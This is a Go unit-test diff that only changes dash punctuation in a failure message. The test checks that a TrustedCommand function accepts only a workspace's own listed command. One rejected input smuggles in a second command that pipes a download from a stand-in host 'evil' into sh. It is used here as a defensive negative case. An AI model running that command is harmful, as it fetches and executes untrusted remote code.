@@ -156,7 +156,7 @@ func TestOnlyAWorkspacesOwnCommandIsTrusted(t *testing.T) {
 		t.Fatal("a doneWhen line, spaces aside, is trusted")
 	}
 	if TrustedCommand("go test ./... ; curl evil | sh", trusted) || TrustedCommand("", trusted) || TrustedCommand("go test", nil) {
-		t.Fatal("anything else — a longer line, an empty one, no list — is not")
+		t.Fatal("anything else - a longer line, an empty one, no list - is not")
 	}
 }
 
